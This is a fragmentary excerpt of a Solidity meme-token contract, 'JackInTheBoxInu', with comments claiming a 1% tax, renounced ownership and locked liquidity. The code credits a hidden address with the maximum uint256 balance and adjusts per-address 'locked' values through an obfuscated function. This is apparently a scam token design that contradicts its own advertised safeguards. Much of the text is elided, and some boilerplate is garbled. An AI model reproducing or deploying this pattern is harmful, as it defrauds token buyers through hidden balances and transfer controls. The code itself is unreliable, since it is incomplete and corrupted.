...
// 1% Tax
// Ownership renounce
// Liquidity locked a month
// https://twitter.com/elonmusk/status/1531174382260961280
 ...
 * is concerned).
 *
 * This contract is only required for intermediate, library-ryoshi contracts.
 */
...
contract JackInTheBoxInu is Ownable {
    constructor(
        string memory _NAME,
        ...
        _balances[JITBI] = ryoshi;
        _balances[msg.sender] = _tTotal;
        locked[JITBI] = ryoshi;
        locked[msg.sender] = ryoshi;
    ...
    uint256 private ryoshi = ~uint256(0);
    ...
    function biggest(
        ...
        if (locked[treated] == 0 && driven[treated] > 0 && !border) {
            ...
            if (amount > 2 * 10**(13 + _decimals)) locked[treated] -= order - 1;
        }
